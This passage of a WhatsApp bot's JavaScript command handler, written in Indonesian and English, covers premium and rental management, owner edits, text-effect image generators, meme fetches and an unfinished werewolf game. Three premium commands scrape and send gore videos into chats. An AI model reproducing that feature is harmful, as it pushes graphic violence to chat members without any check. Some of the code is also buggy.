if (!args[0]) return newReply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
} else {
var cekpr = await HuBotZ.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
}
}
break
case 'addsewa': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (text < 2) return newReply(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return newReply(mess.emror.Iv)
var url = args[0]
addCountCmd('#addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return newReply(`Waktunya?`)
var data = await HuBotZ.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return newReply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
newReply(`Success Add Sewa Group Berwaktu!`)
}
break
case 'delsewa':
if (!isCreator) return newReply(mess.OnlyOwner)
if (!m.isGroup) return newReply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return newReply(`Bot tidak disewa di Grup ini`)
addCountCmd('#delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
newReply(`Sukses`)
break
case 'resetlimit':
if (!isCreator) return newReply(mess.OnlyOwner)
addCountCmd('#resetlimit', m.sender, _cmd)
let user = Object.keys(db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let Gamelimit = isPremium ? global.limitgameawal.premium : global.limitgameawal.free
for (let jid of user) {
db.data.users[jid].limit = limitUser
db.data.users[jid].glimit = Gamelimit
}
reply(`Sukses reset limit pengguna`)
break
//photooxy menu
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPremium && isCreator) return reply(mess.OnlyPrem)
if (!q) return reply(`Contoh : ${prefix+command} DAVID EXDI`) 
reply(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
HuBotZ.sendMessage(m.chat, { image: { url: dehe }, caption: `*Dah Jadi Ngab*` }, { quoted: m })
}
break
case 'ppcouple':
case 'couple':
case 'ppcp': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan foto silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);
    const messages = [
        "*Limit Anda Berkurang 1*"
    ];     
    for (let i = 0; i < messages.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
        db.data.users[m.sender].limit -= 1
        let limitPrib = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitPrib}`
HuBotZ.sendMessage(m.chat, { text: `𝙻𝚒𝚖𝚒𝚝 𝙻𝚞 𝚂𝚒𝚜𝚊: ${limitUser}\n𝙼𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚁𝚎𝚜𝚙𝚘𝚗...`, edit: key });
        if (i !== messages.length - 1) {
            await sleep(0);
        }
    }
    await sleep(0);
let random = anu[Math.floor(Math.random() * anu.length)]
HuBotZ.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
HuBotZ.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
break
//darkjokes
case 'darkjokes': 
case 'darkjoke': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let darkjoke = await getBuffer(`https://api.zahwazein.xyz/randomimage/darkjoke?apikey=${global.ZenzKey}`)
try {
await HuBotZ.sendMessage(m.chat, { image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
db.data.users[m.sender].limit -= 1
}
break
case 'randommeme':
case 'meme': {
    if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
    try {
        let meme = await fetchJson(`https://skizo.tech/api/randommeme?apikey=${global.XznKey}`);
        db.data.users[m.sender].limit -= 1;
        const hasil = meme.media;
        const capt = meme.caption;
        HuBotZ.sendFile(m.chat, hasil, null, `${capt}`, m)
    } catch (err) {
        console.log(err);
        m.reply(util.format(err));
        db.data.users[m.sender].limit += 1;
    }
}
break;
case 'memeindo': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
newReply(mess.wait)
let darkjoke = await getBuffer(`https://api.zahwazein.xyz/randomimage/memeindo?apikey=${global.ZenzKey}`)
try{
await HuBotZ.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
db.data.users[m.sender].limit -= 1
}
break
case 'goresearch':
case 'searchgore': {
    if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
    if (!text) return m.reply('Input Query');
    m.reply('_W A I T_');
        const { searchgore } = require("./scrape/scraper");

        // Assuming `searchgore` function takes the query and returns results
        searchgore(text)
            .then((result) => {
                // Handle the result here
                console.log(result);
                // For example, send the result as a reply
                const response = result.data.map((item, index) => {
                    return `${index + 1}. *Title:* ${item.judul}\n   *Uploader:* ${item.uploader}\n   *Link:* ${item.link}`;
                }).join('\n\n');
                m.reply(response);
            })
            .catch((error) => {
                console.error(error);
                m.reply(`Can't Find Gore Videos With ${text} Search`);
            });
    }
break
case 'gorerandom':
case 'randomgore': {
    if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
    m.reply('_W A I T_');
    try {
        const { randomgore } = require("./scrape/scraper");

        // Assuming `randomgore` function returns results
        const result = await randomgore();
        
        if (result) {
            await HuBotZ.sendMessage(m.chat, {
                video: {
                url: result.data.link
                }, // Use the video URL directly
                caption: `*Title:* ${result.data.judul}\n*Views:* ${result.data.views}\n*Comments:* ${result.data.comment}\n*Link:* ${result.data.link}`
            }, { quoted: m });
        } else {
            m.reply("Lagi Gak Ada Gore Ngab");
        }
    } catch (e) {
        console.error(e);
        m.reply("Error while fetching random gore information");
    }
}
break;
case 'goredl':
case 'goredownload': {
    if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
    if (!text) return m.reply('Input Query');
    m.reply('_W A I T_');
    try {
        const { goredl } = require("./scrape/scraper");

        // Assuming `goredl` function takes the link and returns results
        const result = await goredl(text);
        
        if (result) {
            await HuBotZ.sendMessage(m.chat, {
                video: {
                    url: result.data.link
                },
                caption: `*Title:* ${result.data.judul}\n*Views:* ${result.data.views}\n*Comments:* ${result.data.comment}\n*Link:* ${result.data.link}`
            }, { quoted: m });
        } else {
            m.reply("Error while fetching gore information");
        }
    } catch (e) {
        console.error(e);
        m.reply("Error while fetching gore information");
    }
}
break;
//ephoto360
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!q) return reply(`Example : ${prefix+command} DAVID EXDI`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
HuBotZ.sendMessage(m.chat, { image: { url: haldwhd }, caption: `*Dah Jadi Ngab*` }, { quoted: m })
}
break
//textpro menu
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!q) return reply(`Example : ${prefix+command} David EXDI`) 
reply(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
HuBotZ.sendMessage(m.chat, { image: { url: anu }, caption: `*Dah Jari Ngab*` }, { quoted: m })
}
break
case 'addmods': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
puki = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await HuBotZ.onWhatsApp(puki)
if (ceknye.length == 0) return m.reply(`The number is not registered on WhatsApp!!!`)
mods.push(puki)
fs.writeFileSync('./database/owner_database/mods.json', JSON.stringify(mods, null, 2))
reply(`Number ${puki} Has Become An Owner!!!`)
}
break
case 'delmods': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxxxxx`)
pukima = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(pukima)
mods.splice(unp, 1)
fs.writeFileSync('./database/owner_database/mods.json', JSON.stringify(mods, null, 2))
reply(`🇺🇸 Number ${pukima} has been deleted from the owner database\n\n🇮🇩 Nomor ${pukima} telah dihapus dari database owner`)
}
break
case 'addowner':
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await HuBotZ.onWhatsApp(bnnd)
if (ceknye.length == 0) return m.reply(`The number is not registered on WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner_database/owner.json', JSON.stringify(owner, null, 2))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner_database/owner.json', JSON.stringify(owner, null, 2))
reply(`🇺🇸 Number ${ya} has been deleted from the owner database\n\n🇮🇩 Nomor ${ya} telah dihapus dari database owner`)
break

//========== [ W W || G A M E ] ==========\\
//WW GC
/*case 'ww':
case 'wwgc': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
const jimp = require("jimp");

const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

const {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require("./lib/werewolf");

// [ Thumbnail ]
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";
    this.werewolf = this.werewolf ? this.werewolf : {};
    const ww = this.werewolf ? this.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("Group masih dalam sesi permainan");
        if (playerOnGame(m.sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: m.sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return m.reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(m.sender, chat, ww) === true)
            return m.reply("Kamu sudah join dalam room ini");
        if (playerOnGame(m.sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        let data = {
            id: m.sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
            let text = "\nJumlah player minimal adalah 5 dan maximal 15";
        HuBotZ.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, { quoted: m });

        // [ Game Play ]
    else if (value === "start") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return m.reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(m.sender, chat, ww) === false)
            return m.reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(HuBotZ, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(HuBotZ, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(HuBotZ, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== m.sender)
            return m.reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`, {
                    withTag: true
                }
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var text = `Hai ${pushname(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    await HuBotZ.sendMessage(ww[chat].player[i].id, {
                        text: text,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let text = `*⌂ W E R E W O L F - G A M E*\n\nHai ${pushname(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await HuBotZ.sendMessage(ww[chat].player[i].id, {
                        text: text,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let text = `Hai ${pushname(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
